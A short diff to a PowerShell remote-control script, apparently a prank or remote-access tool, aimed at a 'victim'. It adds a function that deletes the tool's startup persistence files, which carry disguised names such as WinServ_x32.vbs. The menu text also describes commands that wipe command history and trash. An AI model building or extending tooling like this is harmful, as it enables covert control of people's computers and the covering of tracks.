@@ -104,11 +104,17 @@ Write-Output "Send-DadJoke  : DadJoke and plays to the victim."
 Write-Output "MinimizeApps  : Minimizes all the apps."
 Write-Output "=============================================="
 Write-Output "Options     : Show this Menu"
+Write-Output "RMPersist     : Remove Persistance"
 Write-Output "Close       : Close this connection"
 Write-Output "CleanUp  : Del Temp fldrs, cmd history and trash."
 Write-Output "=============================================="
 }
 
+Function RMPersist{
+rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinServ_x32.vbs"
+rm -Path "$env:APPDATA\Microsoft\Windows\x32.ps1"
+Write-Output "Uninstalled."
+}
 
 Function KillDisplay {
 
